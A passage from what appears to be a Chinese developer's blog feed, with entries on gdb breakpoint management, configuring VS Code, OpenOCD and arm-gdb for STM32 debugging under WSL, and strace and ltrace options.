__GI___libc_write (fd=1, buf=0x5555555592a0, nbytes=2) at ../sysdeps/unix/sysv/linux/write.c:26<br>26      ../sysdeps/unix/sysv/linux/write.c: No such file or directory.<br>(gdb) x/2cb 0x5555555592a0 <span class="hljs-comment"># 根据write的参数，buf和nbytes，我们查看下要打印的内容</span><br>0x5555555592a0: 48 <span class="hljs-string">&#x27;0&#x27;</span>  10 <span class="hljs-string">&#x27;\n&#x27;</span> <span class="hljs-comment"># 打印内容为 0和换行符</span><br>(gdb) <span class="hljs-built_in">continue</span><br>Continuing.<br>0<br></code></pre></td></tr></table></figure><h2 id="断点管理"><a href="#断点管理" class="headerlink" title="断点管理"></a>断点管理</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">(gdb) info breakpoints <br>Num     Type           Disp Enb Address            What<br>1       breakpoint     keep y   0x000055555555513d <span class="hljs-keyword">in</span> main at watch.c:6<br>        breakpoint already hit 1 time<br>2       hw watchpoint  keep y                      i<br>3       catchpoint     keep y                      syscall <span class="hljs-string">&quot;write&quot;</span> <br>4       breakpoint     del  y   0x000055555555513d <span class="hljs-keyword">in</span> main at watch.c:6<br></code></pre></td></tr></table></figure><p>从上面断点的信息从左向右来看，每个断点都包含编号、类型、显示、enable状态、断点地址和描述。这三种断点设置后，都会配置一个编号，之后对在断点管理时可以使用该编号。</p><h3 id="查看断点"><a href="#查看断点" class="headerlink" title="查看断点"></a>查看断点</h3><ul><li><p>查看当前所有断点，使用命令：</p><blockquote><p>info breakpoints 或者 info b</p></blockquote></li><li><p>查看当前的内存断点，使用命令：</p><blockquote><p>info watchpoints</p></blockquote></li></ul><h3 id="删除断点"><a href="#删除断点" class="headerlink" title="删除断点"></a>删除断点</h3><p>使用delete或者clear，delete后面可以指定断点编号，删除指定断点，若不指定，则删除所有断点。而clear针对的是地址。</p><ul><li><p>delete删除指定断点</p><blockquote><p>delete [断点编号] </p></blockquote></li><li><p>delete删除连续断点</p><blockquote><p>delete 断点编号开始-断点编号结束</p></blockquote></li><li><p>clear删除指定地址的断点</p><blockquote><p>clear location</p></blockquote></li></ul><h3 id="启用和禁用"><a href="#启用和禁用" class="headerlink" title="启用和禁用"></a>启用和禁用</h3><p>断点设置后，默认是开启状态，若要禁用可以使用disable，禁用之后要重新启动使用enable。</p><ul><li><p>禁用</p><blockquote><p>disable 断点编号</p></blockquote></li><li><p>启用</p><blockquote><p>enable 断点编号</p></blockquote></li></ul><h2 id="断点后加入命令序列"><a href="#断点后加入命令序列" class="headerlink" title="断点后加入命令序列"></a>断点后加入命令序列</h2><p>gdb 支持断点后执行指定的命令序列，用于定制化需求。将命令序列放入到commands和end中间，并且是在设置断点后。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">设置断点<br>commands<br>定制命令1<br>定制命令2<br>...<br>定制命令N<br>end<br><br></code></pre></td></tr></table></figure><h3 id="举例-3"><a href="#举例-3" class="headerlink" title="举例"></a>举例</h3><p>还是上面打印的例子，我们在printf输出i之后，1. 增加输出i+1000，2. 不中断下来。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs bash">GNU gdb (Debian 8.3.1-1) 8.3.1<br>... ...<br>Reading symbols from ./watch...<br>(gdb) b watch.c:7 <span class="hljs-comment"># 断点在printf行</span><br>Breakpoint 1 at 0x1146: file watch.c, line 7.<br>(gdb) commands  <span class="hljs-comment"># 绑定命令序列到该断点上</span><br>Type commands <span class="hljs-keyword">for</span> breakpoint(s) 1, one per line.<br>End with a line saying just <span class="hljs-string">&quot;end&quot;</span>.<br>&gt;<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;%d\n&quot;</span>, i+1000 <span class="hljs-comment"># 输出i+1000</span><br>&gt;<span class="hljs-built_in">continue</span> <span class="hljs-comment"># 继续执行</span><br>&gt;end <span class="hljs-comment"># 命令序列完成关键字</span><br>(gdb) run<br>Starting program: /home/f/doing/debug/gdb/watch <br><br>Breakpoint 1, main () at watch.c:7<br>7               <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, i);<br>1000<br>0<br><br>Breakpoint 1, main () at watch.c:7<br>7               <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, i);<br>1001<br>1<br><br>Breakpoint 1, main () at watch.c:7<br>7               <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, i);<br>1002<br>2<br><br>Breakpoint 1, main () at watch.c:7<br>7               <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, i);<br>1003<br>3<br><br>Breakpoint 1, main () at watch.c:7<br>7               <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, i);<br>1004<br>4<br><br>Breakpoint 1, main () at watch.c:7<br>7               <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, i);<br>1005<br>5<br><br>Breakpoint 1, main () at watch.c:7<br>7               <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, i);<br>1006<br>6<br><br>Breakpoint 1, main () at watch.c:7<br>7               <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, i);<br>1007<br>7<br><br>Breakpoint 1, main () at watch.c:7<br>7               <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, i);<br>1008<br>8<br><br>Breakpoint 1, main () at watch.c:7<br>7               <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, i);<br>1009<br>9<br>[Inferior 1 (process 128987) exited normally]<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>GDB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用vscode+openocd+telnet+arm-gdb编写stm32程序</title>
    <link href="/2023/11/25/%E4%BD%BF%E7%94%A8vscode-openocd-telnet-arm-gdb%E7%BC%96%E5%86%99stm32%E7%A8%8B%E5%BA%8F/"/>
    <url>/2023/11/25/%E4%BD%BF%E7%94%A8vscode-openocd-telnet-arm-gdb%E7%BC%96%E5%86%99stm32%E7%A8%8B%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<p>记录自己在Linux中配置stm32编写环境的过程</p><span id="more"></span><h1 id="安装好arm-tool-chains工具链"><a href="#安装好arm-tool-chains工具链" class="headerlink" title="安装好arm-tool-chains工具链"></a>安装好arm-tool-chains工具链</h1><p><a href="https://askubuntu.com/questions/1243252/how-to-install-arm-none-eabi-gdb-on-ubuntu-20-04-lts-focal-fossa">https://askubuntu.com/questions/1243252/how-to-install-arm-none-eabi-gdb-on-ubuntu-20-04-lts-focal-fossa</a></p><h1 id="安装好openocd"><a href="#安装好openocd" class="headerlink" title="安装好openocd"></a>安装好openocd</h1><p>安装好openocd以后去<code>.bashrc</code>文件中输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">alias</span> ocd=<span class="hljs-string">&quot;openocd.exe -f /usr/local/share/openocd/scripts/interface/cmsis-dap.cfg -f /usr/local/share/openocd/scripts/target/stm32f1x.cfg -c \&quot;bindto 0.0.0.0\&quot; &quot;</span><br></code></pre></td></tr></table></figure><h1 id="安装好telnet"><a href="#安装好telnet" class="headerlink" title="安装好telnet"></a>安装好telnet</h1><p>cat &#x2F;etc&#x2F;resolv.conf查看主机地址，不要使用localhost</p><p>安装好telnet：在<code>.bashrc</code>中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">alias</span> mytel=<span class="hljs-string">&quot;telnet  172.19.240.1 4444&quot;</span> <br></code></pre></td></tr></table></figure><p>由于我使用的是wsl，所以我在使用<code>localhost</code>的时候是无法正常工作的。而是要直接使用主机主机地址。</p><h1 id="安装好vscode插件crotex-debug"><a href="#安装好vscode插件crotex-debug" class="headerlink" title="安装好vscode插件crotex-debug"></a>安装好vscode插件crotex-debug</h1><h1 id="配置好vscode"><a href="#配置好vscode" class="headerlink" title="配置好vscode"></a>配置好vscode</h1><h2 id="tasks-json"><a href="#tasks-json" class="headerlink" title="tasks.json"></a>tasks.json</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-comment">// See https://go.microsoft.com/fwlink/?LinkId=733558</span><br>    <span class="hljs-comment">// for the documentation about the tasks.json format</span><br>    <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2.0.0&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;tasks&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;label&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;OpenOCD&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;command&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;openocd.exe&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                <span class="hljs-comment">// &quot;-f&quot;,</span><br>                <span class="hljs-comment">// &quot;$&#123;input:openocd.config&#125;&quot;,</span><br>                <span class="hljs-string">&quot;-f&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;/usr/local/share/openocd/scripts/interface/fireDAP-mp157.cfg&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;-c&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;\&quot;bindto 0.0.0.0\&quot;&quot;</span><br>            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;shell&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;isBackground&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;problemMatcher&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                <span class="hljs-string">&quot;$gcc&quot;</span><br>            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><span class="hljs-comment">//这个地方是防止vscode报错说找不到问题匹配程序</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;inputs&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;openocd.config&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;pickString&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;description&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Select the configuration file for OpenOCD&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;options&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                <span class="hljs-string">&quot;/usr/local/share/openocd/scripts/target/stm32f1x.cfg&quot;</span><br>            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;default&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/usr/local/share/openocd/scripts/target/stm32f1x.cfg&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="配置好setting-json"><a href="#配置好setting-json" class="headerlink" title="配置好setting.json"></a>配置好setting.json</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;cortex-debug.gdbPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/usr/bin/gdb-multiarch&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;cortex-debug.openocdPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/mnt/d/work/openocd/xpack-openocd-0.12.0-1/bin/openocd.exe&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;cortex-debug.armToolchainPath&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/usr/bin/&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="配置好lauch-json"><a href="#配置好lauch-json" class="headerlink" title="配置好lauch.json"></a>配置好lauch.json</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-comment">// Use IntelliSense to learn about possible attributes.</span><br>  <span class="hljs-comment">// Hover to view descriptions of existing attributes.</span><br>  <span class="hljs-comment">// For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387</span><br>  <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0.2.0&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;configurations&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;(gdb-remote) Debug&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cortex-debug&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;request&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;launch&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;servertype&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;external&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;cwd&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;workspaceRoot&#125;&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;runToEntryPoint&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;main&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;executable&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;/config/stm32f103_elf/test.elf&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;svdFile&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;/config/stm32f103.svd/STM32F1_svd_v1.2/STM32F103.svd&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;gdbTarget&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;172.19.240.1:3333&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;preLaunchTask&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;OpenOCD&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><h2 id="配置好c-cpp-properties-json"><a href="#配置好c-cpp-properties-json" class="headerlink" title="配置好c_cpp_properties.json"></a>配置好c_cpp_properties.json</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;configurations&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Linux&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;includePath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                <span class="hljs-comment">// &quot;$&#123;workspaceFolder&#125;/**&quot;,</span><br>                <span class="hljs-string">&quot;/home/ysc/stm32/test/User/**&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;/STM32F10X_Std/Libraries/STM32F10x_StdPeriph_Driver/inc/**&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;/STM32F10X_Std/Libraries/STM32F10x_StdPeriph_Driver/src/**&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;/STM32F10X_Std/Libraries/CMSIS/**&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;/STM32F10X_Std/Libraries/CMSIS/CM3/CoreSupport/**&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;/STM32F10X_Std/Libraries/CMSIS/CM3/DeviceSupport/ST/STM32F10x/startup/gcc_ride7/**&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;/STM32F10X_Std/Utilities/STM32_EVAL/**&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;/home/ysc/stm32/LED/User/**&quot;</span><br>            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;defines&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                <span class="hljs-string">&quot;STM32F10X_HD&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;USE_STDPERIPH_DRIVER&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;_DEBUG&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;UNICODE&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;_UNICODE&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;__C_ARM&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;__IO&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;__STATIC_INLINE=static&quot;</span><br>            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;compilerPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/usr/bin/arm-linux-gnueabi-gcc&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;cStandard&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;c11&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;cppStandard&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;c++98&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;intelliSenseMode&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;linux-gcc-arm&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">4</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><h1 id="使用方法一"><a href="#使用方法一" class="headerlink" title="使用方法一"></a>使用方法一</h1><p>这个方法是直接在终端环境下进行调试的。</p><ol><li>打开一个终端，输入<code>ocd</code>打开openocd服务</li><li>打卡另一个终端输出<code>mytel</code>，打开telnet服务</li><li>打开第三个终端，使用arm-none-linux-gdb .&#x2F;test.elf进行调试。在gdb中输入<code>target remote 172.19.240.1:3333</code>连接telnet，之后就可以进行调试了。</li></ol><h1 id="使用方法二"><a href="#使用方法二" class="headerlink" title="使用方法二"></a>使用方法二</h1><p>这种方法是使用vscode中的调试插件来进行调试</p>]]></content>
    
    
    <categories>
      
      <category>STM32</category>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>查看程序需要的资源的命令</title>
    <link href="/2023/11/22/%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E9%9C%80%E8%A6%81%E7%9A%84%E8%B5%84%E6%BA%90%E7%9A%84%E5%91%BD%E4%BB%A4/"/>
    <url>/2023/11/22/%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E9%9C%80%E8%A6%81%E7%9A%84%E8%B5%84%E6%BA%90%E7%9A%84%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>记载一些高级命令</p><span id="more"></span><h1 id="strace"><a href="#strace" class="headerlink" title="strace"></a>strace</h1><p>这个命令是用来进行查看命令的系统调用的。</p><h2 id="常用的参数"><a href="#常用的参数" class="headerlink" title="常用的参数"></a>常用的参数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strace -c /usr/bin/ls<br></code></pre></td></tr></table></figure><p><code>-c</code>告诉我们调用了那些系统函数，调用次数多少，消耗了多少时间等等，这些信息对我们分析一个程序来说是非常有用的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strace -p 1234 <br></code></pre></td></tr></table></figure><p><code>-p</code>使得我们可以使用进程号追踪一个进程。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strace -tt <span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p>使用-t选项，可以在每行的输出之前添加时间戳。-tt选项可以展示微秒级别的时间戳。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strace -e open <span class="hljs-built_in">cat</span> dead.letter<br></code></pre></td></tr></table></figure><p>strace命令的-e选项仅仅被用来展示特定的系统调用（例如，open，write等等） </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">-e trace=<span class="hljs-built_in">set</span> 只跟踪指定的系统调用，例如: -e trace=open,close,rean,write 表示只跟踪这四个系统调用，默认的为 <span class="hljs-built_in">set</span>=all 。<br><br>-e trace=file 只跟踪有关文件操作的系统调用。<br><br>-e trace=process 只跟踪有关进程控制的系统调用。<br><br>-e trace=network 跟踪与网络有关的所有系统调用。<br><br>-e strace=signal 跟踪所有与信号有关的系统调用。<br><br>-e trace=ipc 跟踪所有与进程通讯有关的系统调用。<br><br>-e raw=<span class="hljs-built_in">set</span> 将指定的系统调用的参数以十六进制显示。<br><br>-e signal=se t 指定跟踪的系统信号。默认为all（所有信号）。如 signal=!SIGIO 或者 signal=!io ，表示不跟踪 SIGIO 信号。<br><br>-e <span class="hljs-built_in">read</span>=<span class="hljs-built_in">set</span> 输出从指定文件中读出的数据。<br><br>-e write=<span class="hljs-built_in">set</span> 输出写入到指定文件中的数据。<br></code></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://doc.embedfire.com/linux/imx6/base/zh/latest/linux_debug/strace.html">https://doc.embedfire.com/linux/imx6/base/zh/latest/linux_debug/strace.html</a></p><h1 id="ltrace"><a href="#ltrace" class="headerlink" title="ltrace"></a>ltrace</h1><p>这个命令是用来查看命令的库函数调用的。</p><h2 id="常用的参数用法"><a href="#常用的参数用法" class="headerlink" title="常用的参数用法"></a>常用的参数用法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ltrace -S /usr/bin/ls<br></code></pre></td></tr></table></figure><p><code>-S</code>是查看系统调用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">-a 对齐具体某个列的返回值。<br>-c 计算时间和调用，并在程序退出时打印摘要。<br>-C 